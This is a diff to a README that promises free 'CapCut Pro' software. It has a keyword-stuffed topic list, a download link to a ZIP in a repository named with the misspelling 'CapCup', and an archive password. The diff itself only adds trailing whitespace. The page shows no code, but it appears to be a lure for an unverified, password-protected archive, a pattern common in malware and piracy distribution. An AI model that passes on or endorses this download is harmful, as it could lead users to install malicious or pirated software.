@@ -8,7 +8,7 @@ Welcome to the CapCut Pro repository! 🚀 Your ultimate resource for accessing 
 - Topics: CapCut, video-editing, CapCut-Pro, free-video-editor, pro-video-editor, video-effects, mobile-video-editing, video-editing-software capcut download-capcut capcut-pro capcut-pro-download capcut-pro-free video-editing-tools capcut-new-release capcut-download free-capcut capcut-pro-pc-download video-editor-tool capcut-pro-gratis capcut-pro-2025 capcut-pro-para-pc capcut-pro-for-pc capcut-pro-windows capcut-guide capcut-tutorial
 
 ## 🔗 Software Access  
-### Download: [CapCut Pro](https://github.com/xyt0169/CapCup-Pro-For-PC-2025/releases/download/capcut-pro/CapCut.Pro.zip)
+### Download: [CapCut Pro](https://github.com/xyt0169/CapCup-Pro-For-PC-2025/releases/download/capcut-pro/CapCut.Pro.zip) 
 Password-2025
 
 
